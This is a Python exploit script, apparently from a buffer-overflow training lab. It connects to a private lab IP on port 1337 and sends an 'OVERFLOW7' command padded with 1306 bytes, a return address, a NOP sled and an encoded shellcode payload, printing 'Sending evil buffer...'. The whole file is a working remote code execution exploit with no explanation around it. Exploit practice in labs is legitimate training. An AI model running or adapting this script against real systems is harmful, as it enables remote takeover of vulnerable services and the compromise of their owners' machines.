#!/usr/bin/python3

import socket

ip = "10.10.240.201"
port = 1337

prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
retn = "\xbb\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x2f\x16\x0f\x19\x83\xee\xfc\xe2\xf4\xd3\xfe\x8d\x19\x2f\x16"
"\x6f\x90\xca\x27\xcf\x7d\xa4\x46\x3f\x92\x7d\x1a\x84\x4b\x3b"
"\x9d\x7d\x31\x20\xa1\x45\x3f\x1e\xe9\xa3\x25\x4e\x6a\x0d\x35"
"\x0f\xd7\xc0\x14\x2e\xd1\xed\xeb\x7d\x41\x84\x4b\x3f\x9d\x45"
"\x25\xa4\x5a\x1e\x61\xcc\x5e\x0e\xc8\x7e\x9d\x56\x39\x2e\xc5"
"\x84\x50\x37\xf5\x35\x50\xa4\x22\x84\x18\xf9\x27\xf0\xb5\xee"
"\xd9\x02\x18\xe8\x2e\xef\x6c\xd9\x15\x72\xe1\x14\x6b\x2b\x6c"
"\xcb\x4e\x84\x41\x0b\x17\xdc\x7f\xa4\x1a\x44\x92\x77\x0a\x0e"
"\xca\xa4\x12\x84\x18\xff\x9f\x4b\x3d\x0b\x4d\x54\x78\x76\x4c"
"\x5e\xe6\xcf\x49\x50\x43\xa4\x04\xe4\x94\x72\x7e\x3c\x2b\x2f"
"\x16\x67\x6e\x5c\x24\x50\x4d\x47\x5a\x78\x3f\x28\xe9\xda\xa1"
"\xbf\x17\x0f\x19\x06\xd2\x5b\x49\x47\x3f\x8f\x72\x2f\xe9\xda"
"\x49\x7f\x46\x5f\x59\x7f\x56\x5f\x71\xc5\x19\xd0\xf9\xd0\xc3"
"\x98\x73\x2a\x7e\x05\x1f\x32\x83\x67\x1b\x2f\x07\x53\x90\xc9"
"\x7c\x1f\x4f\x78\x7e\x96\xbc\x5b\x77\xf0\xcc\xaa\xd6\x7b\x15"
"\xd0\x58\x07\x6c\xc3\x7e\xff\xac\x8d\x40\xf0\xcc\x47\x75\x62"
"\x7d\x2f\x9f\xec\x4e\x78\x41\x3e\xef\x45\x04\x56\x4f\xcd\xeb"
"\x69\xde\x6b\x32\x33\x18\x2e\x9b\x4b\x3d\x3f\xd0\x0f\x5d\x7b"
"\x46\x59\x4f\x79\x50\x59\x57\x79\x40\x5c\x4f\x47\x6f\xc3\x26"
"\xa9\xe9\xda\x90\xcf\x58\x59\x5f\xd0\x26\x67\x11\xa8\x0b\x6f"
"\xe6\xfa\xad\xef\x04\x05\x1c\x67\xbf\xba\xab\x92\xe6\xfa\x2a"
"\x09\x65\x25\x96\xf4\xf9\x5a\x13\xb4\x5e\x3c\x64\x60\x73\x2f"
"\x45\xf0\xcc")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
